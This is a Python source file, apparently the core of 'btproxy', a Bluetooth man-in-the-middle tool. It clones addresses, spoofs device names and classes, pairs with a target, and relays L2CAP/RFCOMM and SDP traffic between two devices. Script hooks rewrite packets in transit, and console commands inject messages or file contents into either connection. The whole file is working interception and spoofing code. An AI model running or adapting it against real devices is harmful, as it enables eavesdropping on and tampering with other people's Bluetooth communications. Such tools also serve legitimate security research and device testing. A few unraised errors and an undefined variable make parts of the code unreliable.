from __future__ import print_function
import bluetooth, sys, time, select, os, imp
import pickle
from threading import Thread, RLock
from bluetooth import *
from .utils import *
from .adapter import *
from . import argparser

if sys.version < '3':
    input = raw_input
else:
    from importlib import reload

# increments the last octet of a mac addr and returns it as string
class StickyBluetoothSocket(bluetooth.BluetoothSocket):
    def __init__(self,address=None,proto=None, **kwargs):
        self.not_connected = 0
        self.connected = 1
        self.disconnected = 2
        self.sticky_state = self.not_connected
        self.address = address
        self.prevent_recursion = False
        self.target = kwargs.get('target',None)
        self.server = kwargs.get('server',False)
        self._cb = kwargs.get('callback',None)
        if 'sock' in kwargs:
            proto = kwargs['sock']._proto
        bluetooth.BluetoothSocket.__init__(self,proto,kwargs.get('sock',None))

    def close(self,):
        bluetooth.BluetoothSocket.close(self,)
        self.sticky_state = self.not_connected

    def send(self,data,):
        if self.sticky_state == self.not_connected:
            if self.address is None: 
                raise RuntimeError('No address is set in sticky socket')
            self.connect(self.address)
        elif self.sticky_state == self.disconnected:
            self.rebuild()
            self.connect(self.address)
        if self._cb and not self.prevent_recursion:
            self.prevent_recursion = True
            data = self._cb(self,data)
            self.prevent_recursion = False
        return bluetooth.BluetoothSocket.send(self,data)

    def accept(self,):
        newsock,addr= bluetooth.BluetoothSocket.accept(self,)
        newsock = StickyBluetoothSocket(addr, self._proto, sock=newsock)
        newsock.sticky_state = self.connected
        return newsock,addr

    def setTarget(self, target):
        self.target = target
        
    def setCallback(self, cb):
        self._cb = cb

    # @RateLimited(35)
    def relay(self,data):
        return self.relay_non_limited(data)

    def relay_non_limited(self,data):
        try:
            self.target.send(data)
        except BluetoothError as e:
            self.target.sticky_state = self.disconnected
            self.sticky_state = self.disconnected
            self.target.close()
            self.target.rebuild()
            self.error = e

    def rebuild(self,):
        bluetooth.BluetoothSocket.__init__(self,self._proto)
        self.sticky_state = self.not_connected
        #self.connect(self.address)

    def connect(self,addrport=None):
        if not self.server:
            addrport = addrport if addrport is not None else self.address
            bluetooth.BluetoothSocket.connect(self,addrport)
            self.sticky_state = self.connected
        else:
            return self.accept()

def load_sdp_handlers(script):
        if script is None or script == '':
            return None,None
        master_cb = None
        slave_cb = None
        try:
            replace = imp.load_source('btproxy_replace_user_supplied', script)
            try: master_cb = replace.master_sdp_cb
            finally: slave_cb = replace.slave_sdp_cb
        except Exception as e: 
            print_verbose(e)

        def btproxy_sdp_master_cb(sock,req):
            try: 
                req = master_cb(sock,req)
                assert req is not None
            except Exception as e: print(e)
            return req

        def btproxy_sdp_slave_cb(sock,res):
            try: 
                res = slave_cb(sock,res)
                assert res is not None
            except Exception as e: print(e)
            return res

        master_cb_wrap = master_cb if master_cb is None else btproxy_sdp_master_cb
        slave_cb_wrap = slave_cb if slave_cb is None else btproxy_sdp_slave_cb

        return master_cb,slave_cb


def mitm_sdp(master_addr,slave_addr, script=None):
    while True:
        try: _mitm_sdp(master_addr,slave_addr, script)
        except ValueError:pass


def _mitm_sdp(master_addr,slave_addr, script=None):
    server=StickyBluetoothSocket( '',bluetooth.L2CAP )
    server.bind(('',1))
    server.listen(1)

    slave_sock=StickyBluetoothSocket((slave_addr,1),bluetooth.L2CAP,)
    master_sock=StickyBluetoothSocket((master_addr,1),bluetooth.L2CAP,)
    slave_sock.setTarget(master_sock)
    master_sock.setTarget(slave_sock)

    print_verbose('SDP interceptor started')

    master_cb,slave_cb = load_sdp_handlers(script)
    fds = [server, slave_sock, master_sock]
    c = 0

    def clean_fds(fd):
        if fd in fds: 
            if fd.sticky_state == fd.connected:
                fd.close()
            fds.remove(fd)
    while True:
        inputready, outputready, exceptready = select.select(fds,[],[])
        for s in inputready:
            if s == server:
                new_sock,address = server.accept()
                if address[0] == slave_addr:
                    print_verbose("SDP Inq from slave",address)
                    clean_fds(slave_sock)
                    slave_sock = new_sock
                    fds.append(slave_sock)
                    if master_sock not in fds:
                        master_sock = StickyBluetoothSocket((master_addr,1),bluetooth.L2CAP)
                        fds.append(master_sock)
                    new_sock.setTarget(master_sock)
                    # new_sock.setTarget(new_sock)
                    new_sock.setCallback(slave_cb)
                    master_sock.setTarget(new_sock)
                elif address[0] == master_addr:
                    print_verbose("SDP Inq from master",address)
                    clean_fds(master_sock)
                    master_sock = new_sock
                    fds.append(master_sock)
                    if slave_sock not in fds:
                        slave_sock = StickyBluetoothSocket((slave_addr,1),bluetooth.L2CAP)
                        fds.append(slave_sock)
                    new_sock.setTarget(slave_sock)
                    new_sock.setCallback(master_cb)
                    slave_sock.setTarget(new_sock)
                else:
                    print_verbose("SDP Inq from unknown",address)
                    print_verbose("Ignoring")
            else:
                try:
                    data = s.recv(100000)
                    if len(data):
                        print_verbose( '<<SDP>><< '+str(repr(data[0]))+' >><<'+str(len(data))+'>>',s.address[0], '>>' ,s.target.address[0])
                        s.relay(data)
                    else:
                        print_verbose(s.address[0],'disconnected')
                        s.close()
                        clean_fds(s)
                    if s.sticky_state == s.disconnected:
                        print_verbose('disconnected', s.error)
                        s.close()
                        s.target.close()
                        s.target.rebuild()
                        s.rebuild()
                    elif s.target not in fds:
                        RuntimeError('Target not in fds')
                except BluetoothError as e:
                    print_verbose('disconnected',e)
                    s.close()
                    try:
                        str(e[0]).index('104')      # Connection reset by peer
                        s.target.close()
                        s.target.rebuild()
                    except:
                        pass
                    s.rebuild()


class Btproxy():
    def __init__(self,**kwargs):
        self.addrport = ''
        self.shared = False
        self.slave_info = {}
        self.master_info = {}
        self.starting_psm = 0x1023
        self.pickle_path = '.last-btproxy-pairing'
        self.connections = []
        self.servers = []
        self.connections_lock = None
        self._options = [
                ('target_slave',None),
                ('target_master',None),
                ('already_paired',False),
                ('slave_name',''),
                ('master_name',''),
                ('master_adapter',None),
                ('slave_adapter',None),
                ('shared_adapter',None),
                ('clone_addresses',False),
                ('script',''),
                ('half_inquire',False),
                ]
        for i in self._options:
            setattr(self,i[0],i[1])
        self.option(**kwargs)

    def option(self,**kwargs):
        for i in self._options:
            if i[0] in kwargs and kwargs[i[0]] is not None:
                setattr(self,i[0],kwargs[i[0]])

    def setInterface(self, inter):
        self.slave_adapter = inter
        self.master_adapter = inter
        self.shared = True

    def pair(self,adapter,remote_addr,**kwargs):
        tries = kwargs.get('tries',15)
        while True:
            try:
                pair_adapter(adapter, remote_addr)
                break
            except Exception as e:
                tries = tries -1
                if tries <= 0:
                    break
                print(e)
                print('Trying again ..')
                time.sleep(1)

        self.already_paired = True


    def start_service(self, service, adapter_addr=''):
        # print_verbose('Starting service ',service)
        server_sock=None
        if service['port'] in self.servers:
            print('Port',service['port'],'is already binded to')
            return server_sock

        if service['protocol'].lower() == 'l2cap':
            server_sock=BluetoothSocket( L2CAP )
        else:
            server_sock=BluetoothSocket( RFCOMM )
        addrport = (adapter_address(self.master_adapter),service['port'])
        print_verbose('Binding to ',addrport)

        server_sock.bind(addrport)
        self.servers.append(service['port'])
        server_sock.listen(1)

        port = server_sock.getsockname()[1]

        return server_sock

    def do_mitm(self, server_sock, service):
        self._do_mitm(server_sock,service)

    # TODO clean this way up
    def _do_mitm(self, server_sock, service):
        reshandler, reqhandler = self.refresh_handlers()
        #try:
        #    with self.connections_lock:
        #        self.connections.append(service)
        #except Exception as e:
        #    print('Couldn\'t connect to "' + str(service['name']) +'": ', e)
        #    self.barrier.wait()
        #    sys.exit()
        self.barrier.wait()
        master_sock, client_info = server_sock.accept()

        slave_sock = None
        for i in range(0,3):
            try:
                slave_sock = self.connect_to_svc(service, addr='slave')
                break
            except BluetoothError as e:
                print('Connection to ', str(service['name']), 'failed: ', e)
                if i<3:
                    print('Trying again')
                else: 
                    print('Could not connect to ', str(service['name']))
                    sys.exit()
        
        print('Connected to service "' + str(service['name'])+'"')
        print("Accepted connection from ", client_info)
        fds = [master_sock, slave_sock, sys.stdin]
        lastreq = ''
        lastres = ''
        def relay(sender, recv, cb):
            data = sender.recv(1000)
            data = cb(data)
            recv.send(data)

        while True:
            inputready, outputready, exceptready = select.select(fds,[],[])
            for s in inputready:

                # master
                if s == master_sock:
                    try:
                        relay(master_sock, slave_sock, reqhandler)
                    except BluetoothError as e:
                        print(e, 'socket master reconnecting...')
                        slave_sock.close()
                        master_sock, client_info = server_sock.accept()
                        print(e, 'socket slave reconnecting...')
                        slave_sock = self.connect_to_svc(service, reconnect=True, addr='slave' )
                        print("Accepted connection from ", client_info)
                        fds = [master_sock, slave_sock, sys.stdin]
                        break

                # slave
                if s == slave_sock:
                    try:
                        relay(slave_sock, master_sock, reshandler)
                    except BluetoothError as e:
                        print(e, 'socket slave reconnecting...')
                        slave_sock = self.connect_to_svc(service, reconnect=True, addr='slave' )
                        fds = [master_sock, slave_sock, sys.stdin]
                        break

                # user commands 
                # TODO make this clean/modular
                try:
                    if s == sys.stdin:
                        cmd = input()

                        if cmd: print('<< '+ cmd +' >>')
                        cmd = cmd.lower()
                        if cmd[:1] == 'r' or cmd[:7] == 'refresh':
                            print('<< Refreshed >>')
                            reshandler, reqhandler = self.refresh_handlers()
                        elif cmd[:1] == 'a':
                            print('<< Resending last request >>')
                            slave_sock.send( reshandler( lastreq ))
                        elif cmd[:2] == 'sm':
                            print('Enter msg to send to slave:')
                            a = input()
                            print('>>', a)
                            slave_sock.send(a)

                        elif cmd[:2] == 'mm':
                            print('Enter msg to send to master:')
                            a = input()
                            print('<<', a)
                            master_sock.send(a)
                        elif cmd[:2] == 'sf':
                            try:
                                print('sending file contents to slave...')
                                contents = open(cmd.split(' ')[1],'rb').read()
                                print('>>', contents)
                                slave_sock.send(contents)
                            except:
                                print('<< sf: Could not open file >>')


                        elif cmd[:2] == 'mf':
                            print('sending file contents to master...')
                            contents = open(cmd.split(' ')[1],'r').read()
                            print('<<', contents)
                            master_sock.send(contents)

                except BluetoothError as e:
                    print(e)

        server_sock.close() 
        master_sock.close() 
        slave_sock.close() 

    def set_adapter_order(self,):
        """ Set the slave adapter to be the lower hciX """
        if int(self.slave_adapter[3:]) > int(self.master_adapter[3:]):
            tmp = self.slave_adapter
            self.slave_adapter = self.master_adapter
            self.master_adapter = tmp

    def setAddresses(self,):
        if self.clone_addresses:
            adapter_address(self.slave_adapter, inc_last_octet(self.target_master))
            if not self.shared:
                adapter_address(self.master_adapter, inc_last_octet(self.target_slave))

    def setup_adapters(self,):
        if os.getuid() != 0:
            print("Must run as root. (sudo)")
            import sys
            sys.exit(1)

        if not self.already_paired:
            restart_bluetoothd()
            if not self.shared:
                adapters = list_adapters()
                master_adapter = ''
                slave_adapter = ''
                if len(adapters) < 2:
                    if len(adapters) > 0:
                        print('Using shared adapter')
                        slave_adapter = adapters[0]
                        master_adapter = adapters[0]
                        self.shared = True
                    else:
                        raise RuntimeError('No bluetooth adapter has found')
                else:
                    slave_adapter = adapters[0]
                    master_adapter = adapters[1]
                self.option(master_adapter = master_adapter)
                self.option(slave_adapter = slave_adapter)

            self.set_adapter_order()
            enable_adapter(self.slave_adapter,True)

        self.setAddresses()

        if not self.already_paired:

            if not self.shared:
                enable_adapter(self.master_adapter,True)

            print('Slave adapter: ', self.slave_adapter)
            print('Master adapter: ', self.master_adapter)

            print('Looking up info on slave ('+self.target_slave+')')
            self.slave_info = lookup_info(self.target_slave)
            if not self.half_inquire:
                print('Looking up info on master ('+self.target_master+')')
                self.master_info = lookup_info(self.target_master)

        if 'name' not in self.slave_info or not self.slave_info['name']:
            RuntimeError('Slave not discovered')
        if not self.half_inquire:
            if 'name' not in self.master_info or not self.master_info['name']:
                RuntimeError('Master not discovered')
        
        if self.slave_name:
            self.option(slave_name = args.slave_name)
        else:
            self.option(slave_name = str(self.slave_info['name'])+'_btproxy')

        if self.master_name:
            self.option(master_name = args.master_name)
        else:
            if not self.half_inquire:
                self.option(master_name = str(self.master_info['name'])+'_btproxy')
            else:
                self.option(master_name = "master_btproxy")

        if self.shared:
            self.option(master_name = self.slave_name)


        # clone the slave adapter as the master device
        # have the spoofed slave connect directly to master
        #TODO
        """
        if args.slave_active:
            print 'Pairing (spoofed slave & master)...'
            enable_adapter(master_adapter, True)
            adapter_name(master_adapter, mn)
            adapter_class(master_adapter, slave_info['class'])
            enable_adapter_ssp(master_adapter,True)
            advertise_adapter(master_adapter, True)
            while True:
                try:
                    pair_adapter(master_adapter, target_master)
                    break
                except BluetoothError as e:
                    print e
                    print 'Trying again ...'
                    time.sleep(1)
        """
 
    def set_adapter_props(self,):

        print('Spoofing master name as ', self.slave_name)
        adapter_name(self.master_adapter, self.slave_name)
        enable_adapter_ssp(self.master_adapter,True)
        adapter_class(self.master_adapter, self.slave_info['class'])

        if not self.shared: 
            if not self.half_inquire:
                adapter_class(self.slave_adapter, self.master_info['class'])
            enable_adapter_ssp(self.slave_adapter,True)
            print('Spoofing slave name as ', self.master_name)
            adapter_name(self.slave_adapter, self.master_name)

        advertise_adapter(self.master_adapter, True)

    def mitm(self,):
        self.setup_adapters()
               
        self.set_adapter_props()
        
        sdpthread = Thread(target =mitm_sdp, args = (self.target_master,self.target_slave, self.script))
        sdpthread.daemon = True

        threads = []

        if not self.already_paired or args.inquire_again:
            self.socks = self.safe_connect(self.target_slave)

        if not self.already_paired:
            if not self.shared:
                enable_adapter(self.master_adapter, False)
            self.pair(self.slave_adapter,self.target_slave)
            if not self.shared:
                enable_adapter(self.master_adapter, True)
            self.already_paired = True
            print('paired')
 
        instrument_bluetoothd()

        time.sleep(1.5)
        self.set_adapter_props()    # do this again because bluetoothd resets properties
        sdpthread.start()
        self.connections = []  # reset
        self.servers = []
        self.barrier = Barrier(len(self.socks)+1)
        self.connections_lock = RLock()
        # for j in self.socks: print_verbose(j)
        for service in self.socks:
            server_sock = self.start_service(service)
            if server_sock is None:
                self.socks.remove(service)
                continue
            print('Proxy listening for connections for "'+str(service['name'])+'"')
            thread = Thread(target = self.do_mitm, args = (server_sock, service,))
            thread.daemon = True
            threads.append(thread)

        for thr in threads:
            thr.start()
        #self.set_class();

        print('Attempting connections with %d services on slave' % len(self.socks))
        self.barrier.wait()
        #self.set_class();
        #if len(self.connections) < len(self.socks):
        #    if len(self.connections) == 0:
        #        exit(1)
        #    print('At least one service was unable to connect.  Continuing anyways but this may not work.')

        print('Now you\'re free to connect to "'+self.slave_name+'" from master device.')
        with open('.last-btproxy-pairing','wb+') as f:
            self.barrier = None
            self.connections_lock = None
            script_s = self.script
            self.script = None
            pickle.dump(self,f)
            self.script = script_s

        if not self.already_paired:
            if not self.shared: 
                adapter_class(self.master_adapter, self.slave_info['class'])
                if not self.half_inquire:
                    adapter_class(self.slave_adapter, self.master_info['class'])
            else:
                adapter_class(self.slave_adapter, self.slave_info['class'])

        import signal, sys
        def signal_handler(signal, frame):
            sys.exit(0)
        signal.signal(signal.SIGINT, signal_handler)
        signal.pause()

        print('Now connect to '+self.master_name+' from the master device')

        for i in threads:
            i.join()
        sdpthread.join()


    def refresh_handlers(self):
        """
            reloads the manipulation code during runtime
        """
        if self.script:
            replace = imp.load_source('btproxy_replace_user_supplied', self.script)
        else:
            try:
                from . import replace
            except Exception as e: 
                print (e)

        def btproxy_master_cb(req):
            try: 
                req = replace.master_cb(req)
                assert req is not None
            except Exception as e: print(e)
            return req

        def btproxy_slave_cb(res):
            try: 
                res = replace.slave_cb(res)
                assert res is not None
            except Exception as e: print(e)
            return res


        return btproxy_slave_cb, btproxy_master_cb

    def connect_to_svc(self,service, **kwargs):
        print_verbose('connecting to', service)
        socktype = bluetooth.RFCOMM
        if service['protocol'] == None or service['protocol'].lower() == 'rfcomm':
            socktype = bluetooth.RFCOMM

        elif service['protocol'].lower() == 'l2cap':
            socktype = bluetooth.L2CAP
        else:
            print('Unsupported protocol '+service['protocol'])

        while True:
            try:
                sock=bluetooth.BluetoothSocket( socktype )
                if kwargs.get('addr',None) == 'slave': # and 0
                    
                    for i in range(0,3):
                        try:
                            addrport=(adapter_address(self.slave_adapter),self.starting_psm)
                            print_verbose('binding to ', addrport)
                            sock.bind(addrport)
                            self.starting_psm += 2
                            break
                        except BluetoothError as e:
                            if i==2: raise e

                sock.connect((service['host'], service['port'] if service['port'] else 1))

                print_verbose('Connected')
                return sock
            except BluetoothError as e:
                if not kwargs.get('reconnect',False):
                    raise RuntimeError(e)
                print('Reconnecting...')


    def safe_connect(self,target):
        """
            Connect to all services on target as a client.
        """

        services = bluetooth.find_service(address=target)
        
        if len(services) <= 0:
            print( 'Running inquiry scan')
            services = inquire(target)

        socks = []
        for svc in services:
            try:
                socks.append( svc )
            except BluetoothError as e:
                print('Couldn\'t connect: ',e)

        if len(services) > 0:
            return remove_duplicate_services(socks)
        else:
            raise RuntimeError('Could not lookup '+target)


    def __eq__(self, other):
        self.notequal = ''
        if not (isinstance(other, self.__class__)):
            self.notequal = "Different class"
        if not (
                self.target_slave == other.target_slave
                and self.target_master == other.target_master):
            self.notequal = "Different slave or master target addresses"

        
        adapters = list_adapters()
        comparer = other if other.slave_adapter else self
        if not (comparer.master_adapter in adapters 
            and comparer.slave_adapter in adapters
            and (comparer.slave_adapter != comparer.master_adapter or len(adapters)==1)):
            self.notequal = "Different adapters"

        return not self.notequal

    def __ne__(self, other):
        return not self.__eq__(other)


